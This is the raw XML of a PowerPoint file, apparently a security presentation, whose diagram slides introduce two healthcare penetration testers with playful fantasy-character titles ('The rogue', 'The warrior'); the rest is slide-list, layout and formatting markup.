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diagrams/drawing2.xml" ContentType="application/vnd.ms-office.drawingml.diagramDrawing+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notesSlides/notesSlide38.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notes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diagrams/colors2.xml" ContentType="application/vnd.openxmlformats-officedocument.drawingml.diagramColors+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diagrams/layout2.xml" ContentType="application/vnd.openxmlformats-officedocument.drawingml.diagram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diagrams/data1.xml" ContentType="application/vnd.openxmlformats-officedocument.drawingml.diagramData+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p:sldMasterIdLst>
    <p:sldMasterId id="2147483648" r:id="rId1"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId40"/>
  </p:notesMasterIdLst>
  <p:handoutMasterIdLst>
    <p:handoutMasterId r:id="rId41"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="258" r:id="rId3"/>
    <p:sldId id="277" r:id="rId4"/>
    <p:sldId id="304" r:id="rId5"/>
    <p:sldId id="309" r:id="rId6"/>
    <p:sldId id="279" r:id="rId7"/>
    <p:sldId id="280" r:id="rId8"/>
    <p:sldId id="281" r:id="rId9"/>
    <p:sldId id="310" r:id="rId10"/>
    <p:sldId id="282" r:id="rId11"/>
    <p:sldId id="283" r:id="rId12"/>
    <p:sldId id="284" r:id="rId13"/>
    <p:sldId id="285" r:id="rId14"/>
    <p:sldId id="305" r:id="rId15"/>
    <p:sldId id="286" r:id="rId16"/>
    <p:sldId id="287" r:id="rId17"/>
    <p:sldId id="311" r:id="rId18"/>
    <p:sldId id="288" r:id="rId19"/>
    <p:sldId id="289" r:id="rId20"/>
    <p:sldId id="290" r:id="rId21"/>
    <p:sldId id="291" r:id="rId22"/>
    <p:sldId id="292" r:id="rId23"/>
    <p:sldId id="293" r:id="rId24"/>
    <p:sldId id="294" r:id="rId25"/>
    <p:sldId id="295" r:id="rId26"/>
    <p:sldId id="296" r:id="rId27"/>
    <p:sldId id="312" r:id="rId28"/>
    <p:sldId id="297" r:id="rId29"/>
    <p:sldId id="298" r:id="rId30"/>
    <p:sldId id="299" r:id="rId31"/>
    <p:sldId id="300" r:id="rId32"/>
    <p:sldId id="313" r:id="rId33"/>
    <p:sldId id="301" r:id="rId34"/>
    <p:sldId id="302" r:id="rId35"/>
    <p:sldId id="307" r:id="rId36"/>
    <p:sldId id="308" r:id="rId37"/>
    <p:sldId id="306" r:id="rId38"/>
    <p:sldId id="275" r:id="rId39"/>
  </p:sldIdLst>
  <p:sldSz cx="9144000" cy="6858000" type="screen4x3"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="Calibri" pitchFamily="34" charset="0"/>
      <p:regular r:id="rId42"/>
      <p:bold r:id="rId43"/>
      <p:italic r:id="rId44"/>
      <p:boldItalic r:id="rId45"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Wingdings 2" pitchFamily="18" charset="2"/>
      <p:regular r:id="rId46"/>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B400"/>
    <a:srgbClr val="2E3E00"/>
    <a:srgbClr val="506E00"/>
    <a:srgbClr val="648C00"/>
    <a:srgbClr val="83B800"/>
    <a:srgbClr val="E0D1AE"/>
    <a:srgbClr val="FF3300"/>
    <a:srgbClr val="404040"/>
    <a:srgbClr val="FFFFFF"/>
    <a:srgbClr val="F6F1DE"/>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77" autoAdjust="0"/>
    <p:restoredTop sz="94632" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr>
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="106" d="100"/>
          <a:sy n="106" d="100"/>
        </p:scale>
        <p:origin x="-1680" y="-9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81" d="100"/>
          <a:sy n="81" d="100"/>
        </p:scale>
        <p:origin x="-1020" y="-78"/>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viewProps" Target="viewProps.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1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1.jpeg"/></Relationships>
</file>

<file path=ppt/diagrams/_rels/data2.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2.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><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BE62D9-E3DF-49C7-B02E-B30228EBE0AE}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#1" loCatId="picture" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple1" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/accent1_2" csCatId="accent1" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fr-CA"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{73F3AEF2-D33E-408B-9E2D-2C6BAD3E92FD}">
      <dgm:prSet phldrT="[Texte]" custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr lIns="0" tIns="72000" rIns="0"/>
        <a:lstStyle/>
        <a:p>
          <a:pPr algn="l">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1800" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:rPr>
            <a:t>Stefan Morris</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr algn="l">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcAft>
              <a:spcPts val="1200"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" b="1" cap="all" baseline="0" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>The rogue</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr algn="l">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="en-US" sz="1400" noProof="0" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>Penetration</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> tester</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr algn="l">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" noProof="0" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>App</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>security</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>assesser</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
            <a:solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="75000"/>
                <a:lumOff val="25000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr algn="l">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>4 </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>yr</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>. </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>healthcare</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> IS </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>experience</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
            <a:solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="75000"/>
                <a:lumOff val="25000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr algn="l">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>Dangerous</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>with</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> a </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>dirk</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1400" dirty="0">
            <a:solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="75000"/>
                <a:lumOff val="25000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B5B83F9F-2E42-46E0-917E-41A8418A86EA}" type="parTrans" cxnId="{4651BD2E-CDCE-4DB4-A954-B6E3CF13D1B2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fr-CA"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9A4A50C0-381A-44E0-BC17-7131166765F4}" type="sibTrans" cxnId="{4651BD2E-CDCE-4DB4-A954-B6E3CF13D1B2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fr-CA"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3DF99565-C45C-4440-A910-CA0C80068F61}" type="pres">
      <dgm:prSet presAssocID="{BFBE62D9-E3DF-49C7-B02E-B30228EBE0AE}" presName="Name0" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fr-CA"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6106BF9D-68A6-41DA-9E83-740FB75EFA6E}" type="pres">
      <dgm:prSet presAssocID="{73F3AEF2-D33E-408B-9E2D-2C6BAD3E92FD}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DBC406D6-F4F2-4DAC-B0A5-7255F55B48DF}" type="pres">
      <dgm:prSet presAssocID="{73F3AEF2-D33E-408B-9E2D-2C6BAD3E92FD}" presName="pictRect" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="1" custScaleX="133101" custScaleY="88378" custLinFactNeighborX="-406" custLinFactNeighborY="-63567"/>
      <dgm:spPr>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
        <a:blipFill dpi="0" rotWithShape="1">
          <a:blip xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" r:embed="rId1" cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" xmlns="" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </a:blipFill>
        <a:ln w="50800" cap="sq">
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:miter lim="800000"/>
        </a:ln>
        <a:effectLst>
          <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr" rotWithShape="0">
            <a:prstClr val="black">
              <a:alpha val="40000"/>
            </a:prstClr>
          </a:outerShdw>
        </a:effectLst>
      </dgm:spPr>
      <dgm:extLst>
        <a:ext uri="{E40237B7-FDA0-4F09-8148-C483321AD2D9}">
          <dgm14:cNvPr xmlns:dgm14="http://schemas.microsoft.com/office/drawing/2010/diagram" xmlns="" id="0" name="" title="Photo"/>
        </a:ext>
      </dgm:extLst>
    </dgm:pt>
    <dgm:pt modelId="{4548E708-58F6-4FEA-B801-953227BAC05D}" type="pres">
      <dgm:prSet presAssocID="{73F3AEF2-D33E-408B-9E2D-2C6BAD3E92FD}" presName="textRect" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="1" custScaleX="133776" custScaleY="340006" custLinFactNeighborX="-68" custLinFactNeighborY="53725">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fr-CA"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{D6C4D229-D7B0-4851-A763-83BECDCEAF1D}" type="presOf" srcId="{BFBE62D9-E3DF-49C7-B02E-B30228EBE0AE}" destId="{3DF99565-C45C-4440-A910-CA0C80068F61}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#1"/>
    <dgm:cxn modelId="{4651BD2E-CDCE-4DB4-A954-B6E3CF13D1B2}" srcId="{BFBE62D9-E3DF-49C7-B02E-B30228EBE0AE}" destId="{73F3AEF2-D33E-408B-9E2D-2C6BAD3E92FD}" srcOrd="0" destOrd="0" parTransId="{B5B83F9F-2E42-46E0-917E-41A8418A86EA}" sibTransId="{9A4A50C0-381A-44E0-BC17-7131166765F4}"/>
    <dgm:cxn modelId="{92FDEA4C-A56E-4C64-B587-5E651FA3C177}" type="presOf" srcId="{73F3AEF2-D33E-408B-9E2D-2C6BAD3E92FD}" destId="{4548E708-58F6-4FEA-B801-953227BAC05D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#1"/>
    <dgm:cxn modelId="{8CC12111-EBE2-4209-8305-4ED26231BBAA}" type="presParOf" srcId="{3DF99565-C45C-4440-A910-CA0C80068F61}" destId="{6106BF9D-68A6-41DA-9E83-740FB75EFA6E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#1"/>
    <dgm:cxn modelId="{DD74EE6F-E4AF-41B6-B574-D02716476EF8}" type="presParOf" srcId="{6106BF9D-68A6-41DA-9E83-740FB75EFA6E}" destId="{DBC406D6-F4F2-4DAC-B0A5-7255F55B48DF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#1"/>
    <dgm:cxn modelId="{1991BA6A-4F29-4FCD-B52C-A1B31F1B266F}" type="presParOf" srcId="{6106BF9D-68A6-41DA-9E83-740FB75EFA6E}" destId="{4548E708-58F6-4FEA-B801-953227BAC05D}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#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FBE62D9-E3DF-49C7-B02E-B30228EBE0AE}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/pList1#3" loCatId="picture" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple1" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/accent1_2" csCatId="accent1" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fr-CA"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{73F3AEF2-D33E-408B-9E2D-2C6BAD3E92FD}">
      <dgm:prSet phldrT="[Texte]" custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr lIns="0" tIns="72000" rIns="0"/>
        <a:lstStyle/>
        <a:p>
          <a:pPr algn="l">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1800" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:rPr>
            <a:t>Tim </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1800" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:rPr>
            <a:t>Elrod</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1800" dirty="0" smtClean="0">
            <a:solidFill>
              <a:srgbClr val="82B400"/>
            </a:solidFill>
            <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr algn="l">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcAft>
              <a:spcPts val="1200"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" b="1" cap="all" baseline="0" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>The </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" b="1" cap="all" baseline="0" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>warrior</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1400" b="1" cap="all" baseline="0" dirty="0" smtClean="0">
            <a:solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="75000"/>
                <a:lumOff val="25000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr algn="l">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>Penetration</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> tester for FNS</a:t>
          </a:r>
        </a:p>
        <a:p>
          <a:pPr algn="l">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>Over 7 </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>years</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>testing</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>healthcare</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>systems</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
            <a:solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="75000"/>
                <a:lumOff val="25000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr algn="l">
            <a:lnSpc>
              <a:spcPct val="100000"/>
            </a:lnSpc>
            <a:spcAft>
              <a:spcPts val="0"/>
            </a:spcAft>
          </a:pPr>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>Able </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" err="1" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t>with</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="fr-CA" sz="1400" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:rPr>
            <a:t> an axe</a:t>
          </a:r>
          <a:endParaRPr lang="fr-CA" sz="1400" dirty="0">
            <a:solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="75000"/>
                <a:lumOff val="25000"/>
              </a:schemeClr>
            </a:solidFill>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B5B83F9F-2E42-46E0-917E-41A8418A86EA}" type="parTrans" cxnId="{4651BD2E-CDCE-4DB4-A954-B6E3CF13D1B2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fr-CA"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9A4A50C0-381A-44E0-BC17-7131166765F4}" type="sibTrans" cxnId="{4651BD2E-CDCE-4DB4-A954-B6E3CF13D1B2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fr-CA"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3DF99565-C45C-4440-A910-CA0C80068F61}" type="pres">
      <dgm:prSet presAssocID="{BFBE62D9-E3DF-49C7-B02E-B30228EBE0AE}" presName="Name0" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="fr-CA"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6106BF9D-68A6-41DA-9E83-740FB75EFA6E}" type="pres">
      <dgm:prSet presAssocID="{73F3AEF2-D33E-408B-9E2D-2C6BAD3E92FD}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DBC406D6-F4F2-4DAC-B0A5-7255F55B48DF}" type="pres">
      <dgm:prSet presAssocID="{73F3AEF2-D33E-408B-9E2D-2C6BAD3E92FD}" presName="pictRect" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="1" custScaleX="133101" custScaleY="88378" custLinFactNeighborX="-406" custLinFactNeighborY="-63567"/>
      <dgm:spPr>
